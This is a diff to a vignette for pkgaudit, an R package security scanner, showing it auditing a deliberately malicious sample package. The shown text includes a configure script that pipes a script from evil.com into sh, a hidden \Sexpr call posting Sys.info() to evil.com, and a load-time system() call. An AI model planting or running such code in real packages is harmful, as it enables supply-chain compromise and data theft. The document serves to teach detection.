@@ -56,9 +56,9 @@ loaded:
     }
 
 A help file can carry R code in two places that run at different times.
-An `\examples{}` block runs under `R CMD check`. A `\Sexpr{}` macro runs
-whenever the page is rendered, which includes `R CMD build` and
-installation from source:
+An `\examples{}` block runs under `R CMD check`. An `\Sexpr{}` macro
+runs whenever the page is rendered, which includes `R CMD build`,
+`R CMD check`, and installation from source:
 
     \name{fetch_data}
     \alias{fetch_data}
@@ -89,9 +89,9 @@ result <- audit_package(pkg)
 print(result)
 #> --- pkgaudit ----------------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
-#> Path:      /tmp/RtmpGWbQkn/untrustedpkg-example/untrustedpkg
+#> Path:      /tmp/Rtmpbulvsr/untrustedpkg-example/untrustedpkg
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-24 17:47 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-24 18:36 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> File contexts:  1
 #> Patterns:       4
@@ -108,9 +108,9 @@ the code runs in, with the MITRE ATT&CK techniques the rule carries.
 summary(result)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
-#> Path:      /tmp/RtmpGWbQkn/untrustedpkg-example/untrustedpkg
+#> Path:      /tmp/Rtmpbulvsr/untrustedpkg-example/untrustedpkg
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-24 17:47 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-24 18:36 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> --- R Patterns --------------------------------------------------------------
 #> phase            rule            n   attck
@@ -159,11 +159,31 @@ names(result)
 #> [5] "errors"        "metadata"
 ```
 
+`file_contexts` reports files that are security-relevant in themselves,
+whatever they contain: R runs a `configure` script, so the script is
+worth a reviewer’s attention. A row carries the rule’s `message` and the
+lifecycle phases.
+
+``` r
+
+result$file_contexts[, c("rule", "file_context")]
+#>        rule file_context
+#> 3 configure    configure
+```
+
 `patterns` holds security-relevant R calls, located by file, line and
-column, and records the code context each one sits in. Every findings
-frame also carries the rule’s `message`, its ATT&CK techniques, and one
-logical column per lifecycle phase; those are omitted below to keep the
-output readable.
+column, and records the code context each one sits in. Both `patterns`
+and `matches` also carry the rule’s `message`, its ATT&CK techniques,
+and one logical column per lifecycle phase; those are omitted below to
+keep the output readable.
+
+Additionally, `guarded` is `TRUE` for code that ships but the lifecycle
+does not run, such as a `\dontrun{}` block or a vignette chunk marked
+`eval=FALSE`. `indirect` is `TRUE` where a call was made through the
+function’s name rather than the function, as in
+`do.call("system", ...)`; the finding is reported under the rule that
+owns the name, so filtering on `rule` finds every call to it however it
+was spelled.
 
 ``` r
 
@@ -182,7 +202,7 @@ result$patterns[, c("rule", "file_context", "line_number", "code_context",
 ```
 
 `matches` mirrors `patterns` but carries none of the three columns that
-come from a parse tree – `code_context`, `guarded` and `indirect`. A
+come from a parse tree – `code_context`, `guarded`, and `indirect`. A
 shell script has no R parse tree to sit in, so a match is located by
 file and line alone.
 
@@ -245,7 +265,7 @@ summary(result, phase = "at_load", path = FALSE)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-24 17:47 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-24 18:36 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> Phases:    at_load
 #> 
 #> --- R Patterns --------------------------------------------------------------
@@ -267,59 +287,58 @@ loads it, so one occurrence is counted under every phase it runs in.
 
 ## Reviewing findings
 
-Two columns describe how code is *reached* rather than what it is, and
-both bear on how much weight a finding deserves. `guarded` is `TRUE` for
-code that ships but the lifecycle does not run, such as a `\dontrun{}`
-block or a vignette chunk marked `eval=FALSE`. `indirect` is `TRUE`
-where a call was made through the function’s name rather than the
-function, as in `do.call("system", ...)`; the finding is reported under
-the rule that owns the name, so filtering on `rule` finds every call to
-it however it was spelled.
+`untrustedpkg` returns six findings: one file context, four patterns,
+and one match.
 
-`untrustedpkg` returns five findings. Read in order of the phases they
-run in, they escalate.
+1.  **[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
+    `R/fetch.R` runs at no phase.** It sits in the body of
+    `fetch_data()`, so it executes only if a user calls that function. A
+    package that downloads a file when asked to download a file is doing
+    its job. This is the baseline: a capability, disclosed in an
+    exported function.
 
-**[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
-`R/fetch.R` runs at no phase.** It sits in the body of `fetch_data()`,
-so it executes only if a user calls that function. A package that
-downloads a file when asked to download a file is doing its job. This is
-the baseline: a capability, disclosed in an exported function.
+2.  **[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
+    `man/fetch_data.Rd` runs under `R CMD check`.** The same call
+    appears in the `\examples{}` block, so checking the package fetches
+    the URL. Examples are meant to run, and a reviewer would weigh this
+    as documentation that reaches the network rather than as an attack.
 
-**[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
-`man/fetch_data.Rd` runs under `R CMD check`.** The same call appears in
-the `\examples{}` block, so checking the package fetches the URL.
-Examples are meant to run, and a reviewer would weigh this as
-documentation that reaches the network rather than as an attack.
+3.  **[`system()`](https://rdrr.io/r/base/system.html) in `R/zzz.R` runs
+    on [`library()`](https://rdrr.io/r/base/library.html).** `.onLoad()`
+    is called when the namespace loads, so `system("uname -a")` executes
+    on [`library()`](https://rdrr.io/r/base/library.html) – which loads
+    before it attaches – and again at build, check, and installation
+    from source, each of which loads the package. Nobody asked for it.
+    The command itself is reconnaissance rather than damage, but the
+    capability is arbitrary shell execution at load time.
 
-**[`system()`](https://rdrr.io/r/base/system.html) in `R/zzz.R` runs on
-[`library()`](https://rdrr.io/r/base/library.html).** `.onLoad()` is
-called when the namespace loads, so `system("uname -a")` executes on
-[`library()`](https://rdrr.io/r/base/library.html) – which loads before
-it attaches – and again at build, check, and installation from source,
-each of which loads the package. Nobody asked for it. The command itself
-is reconnaissance rather than damage, but the capability is arbitrary
-shell execution at load time.
+4.  **`curl` in `configure` runs at build, check, and installation from
+    source.** This executes before any R code is loaded, and what it
+    executes is not in the package: it is whatever the remote host
+    serves at the moment of installation. Nothing in the source says
+    what will run.
 
-**`curl` in `configure` runs at installation from source.** The script
-pipes a remote script directly into a shell:
+&nbsp;
 
     #!/bin/sh
     echo configuring
     curl -s https://www.evil.com/evil.sh | sh
 
-This executes before any R code is loaded, and what it executes is not
-in the package: it is whatever the remote host serves at the moment of
-installation. Nothing in the source says what will run.
+5.  **`configure` is reported as a file, whatever it contains.** A
+    `configure` matching no rule at all would still be reported, since
+    the question for a reviewer is whether the package should be running
+    a shell script during installation.
 
-**[`httr::POST()`](https://httr.r-lib.org/reference/POST.html) in
-`man/fetch_data.Rd` runs when the help page is built, and is
-invisible.** The call sits in a `\Sexpr[results=hide]{}` macro in the
-`\description{}` block. `\Sexpr{}` is evaluated whenever the page is
-rendered, during `R CMD build` and installation from source;
-`results=hide` suppresses its output. A reader of `?fetch_data` sees a
-one-line description and an example, and no sign that rendering the page
-sent [`Sys.info()`](https://rdrr.io/r/base/Sys.info.html) to a remote
-host.
+6.  **[`httr::POST()`](https://httr.r-lib.org/reference/POST.html) in
+    `man/fetch_data.Rd` runs when the help page is built, and is
+    invisible.** The call sits in a `\Sexpr[results=hide]{}` macro in
+    the `\description{}` block. `\Sexpr{}` is evaluated whenever the
+    page is rendered, during `R CMD build`, `R CMD check`, and
+    installation from source; `results=hide` suppresses its output. A
+    reader of `?fetch_data` sees a one-line description and an example,
+    and no sign that rendering the page sent
+    [`Sys.info()`](https://rdrr.io/r/base/Sys.info.html) to a remote
+    host.
 
 ``` r
 
@@ -331,9 +350,7 @@ result$patterns[result$patterns$code_context == "Rd_Sexpr_install",
 #> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
 ```
 
-This is the finding that motivates scanning documentation as code. It
-runs automatically, it exfiltrates, and it is invisible both to a user
-reading the help page and to any scanner that reads only `.R` files.
+## Adjudicating a package
 
 A clean scan is weak evidence of safety. pkgaudit reasons about syntax,
 so sufficiently indirect code can evade any pattern rule. A call whose
@@ -356,9 +373,6 @@ verdict. In review, the questions worth asking are roughly:
 - Is the code being run visible in the source, or is it assembled,
   decoded, or fetched at runtime?
 - What did the scan not read, and does any of it run automatically?
-
-Findings that answer badly on several of these at once are the ones to
-read closely.
 
 ## Exporting findings
 
@@ -384,11 +398,11 @@ substr(sarif, 1, 200)
 
 Written to a file and opened in an editor with a SARIF viewer, each
 finding appears on the line it was found. Rule identifiers are
-namespaced by the kind of rule – `pattern/curl`, `match/curl` – because
-a rule name is unique only within its kind. `level` is `note` for every
-result: pkgaudit does not rank findings, so nothing is mapped onto
-SARIF’s severity field, and when a finding’s code executes is carried in
-the result’s `properties.phases`.
+namespaced by the kind of rule – `pattern/curl`, `match/curl`,
+`file/configure` – because a rule name is unique only within its kind.
+`level` is `note` for every result: pkgaudit does not rank findings, so
+nothing is mapped onto SARIF’s severity field, and when a finding’s code
+executes is carried in the result’s `properties.phases`.
 
 [`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
 writes the code pkgaudit cannot read into a directory a scanner such as
@@ -398,8 +412,8 @@ blank-padded so that its code sits at the same line numbers it occupies
 in the source. A finding another tool reports at line 40 of
 `intro.python.py` is therefore at line 40 of `intro.Rmd`.
 
-`untrustedpkg` is R and shell throughout, so there is nothing to hand on
-and the manifest comes back empty:
+`untrustedpkg` carries nothing in a language pkgaudit cannot read, so
+there is nothing to hand on and the manifest comes back empty:
 
 ``` r
 
@@ -415,8 +429,7 @@ naming one is how the caller consents to being written to.
 
 ## Auditing a tarball
 
-The more common workflow is to scan a package that has not been
-installed.
+A common workflow will be to scan a package that has not been installed.
 [`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
 takes a `.tar.gz` source package, validates it, extracts it to a
 temporary directory, scans it, and removes the directory. An untrusted
@@ -429,7 +442,7 @@ print(audit_tarball(tarball), path = FALSE)
 #> --- pkgaudit ----------------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source tarball)
 #> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
-#> Scanned:   2026-08-24 17:47 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-24 18:36 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> File contexts:  1
 #> Patterns:       4
